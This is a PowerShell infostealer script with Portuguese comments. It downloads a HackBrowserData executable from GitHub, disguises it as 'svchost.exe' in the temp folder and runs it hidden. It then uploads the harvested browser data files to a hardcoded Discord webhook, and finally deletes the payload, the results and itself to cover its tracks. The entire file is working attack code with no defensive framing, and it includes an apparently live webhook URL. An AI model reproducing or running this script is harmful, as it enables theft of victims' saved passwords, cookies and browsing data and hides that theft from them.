<#
.SYNOPSIS
    Baixa e executa HackBrowserData, envia cada arquivo gerado via webhook Discord.
    Compatível com Windows PowerShell 5.1.
#>

# ===== CONFIGURAÇÕES =====
$exeUrl    = "https://github.com/gsfv/tro.j/raw/refs/heads/main/k9QxW2mB5vP7jR8tL3y4.exe"
$webhook   = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
$tempDir   = $env:TEMP
$payload   = Join-Path $tempDir "svchost.exe"
$resultsDir = Join-Path $tempDir "results"

# ===== FUNÇÃO PARA ENVIAR MENSAGEM SIMPLES AO DISCORD =====
function Send-DiscordMessage {
    param([string]$content)
    try {
        # Remove quebras de linha e caracteres especiais para JSON válido
        $cleanContent = $content -replace '"', '\"' -replace '\n', ' ' -replace '\r', ''
        $body = "{`"content`": `"$cleanContent`"}"
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json" | Out-Null
    } catch {
        Write-Host "[-] Falha ao enviar mensagem: $_"
    }
}

# ===== FUNÇÃO PARA ENVIAR ARQUIVO VIA Invoke-RestMethod =====
function Send-File {
    param([string]$filePath)
    $fileName = Split-Path $filePath -Leaf
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    # Monta corpo multipart manualmente
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream$LF",
        [System.Text.Encoding]::UTF8.GetString($fileBytes),
        "--$boundary--$LF"
    )
    $body = $bodyLines -join $LF

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        return $true
    } catch {
        Send-DiscordMessage "Erro ao enviar $fileName : $($_.Exception.Message)"
        return $false
    }
}

# ===== NOTIFICA INÍCIO =====
Send-DiscordMessage "ANDRE iniciado em $env:COMPUTERNAME ($(Get-Date -Format 'HH:mm:ss'))"

# ===== 1. BAIXAR EXECUTÁVEL =====
try {
    Write-Host "[*] Baixando payload..."
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
    $webClient.DownloadFile($exeUrl, $payload)
    Write-Host "[+] Payload salvo em $payload"
} catch {
    Send-DiscordMessage "Falha no download: $($_.Exception.Message)"
    exit 1
}

# ===== 2. EXECUTAR =====
try {
    Write-Host "[*] Executando $payload..."
    $proc = Start-Process -FilePath $payload -WorkingDirectory $tempDir -WindowStyle Hidden -PassThru
    $proc.WaitForExit()
    Write-Host "[+] Executável concluído (código $($proc.ExitCode))."
} catch {
    Send-DiscordMessage "Falha na execucao: $($_.Exception.Message)"
}

Start-Sleep -Seconds 2

# ===== 3. VERIFICAR RESULTADOS =====
if (-not (Test-Path $resultsDir)) {
    Send-DiscordMessage "Pasta 'results' nao encontrada em $tempDir."
    Remove-Item $payload -Force -ErrorAction SilentlyContinue
    exit 1
}

$files = Get-ChildItem -Path $resultsDir -Recurse -File
if ($files.Count -eq 0) {
    Send-DiscordMessage "Nenhum arquivo na pasta results."
    Remove-Item $payload -Force -ErrorAction SilentlyContinue
    Remove-Item $resultsDir -Recurse -Force -ErrorAction SilentlyContinue
    exit 1
}

Send-DiscordMessage "Enviando $($files.Count) arquivo(s)..."

# ===== 4. ENVIAR ARQUIVOS =====
$sent = 0
foreach ($file in $files) {
    if (Send-File $file.FullName) {
        $sent++
    }
    Start-Sleep -Milliseconds 300
}

Send-DiscordMessage "Concluido: $sent de $($files.Count) arquivos enviados."

# ===== 5. LIMPEZA =====
Remove-Item $payload -Force -ErrorAction SilentlyContinue
Remove-Item $resultsDir -Recurse -Force -ErrorAction SilentlyContinue
if ($MyInvocation.MyCommand.Path) {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}
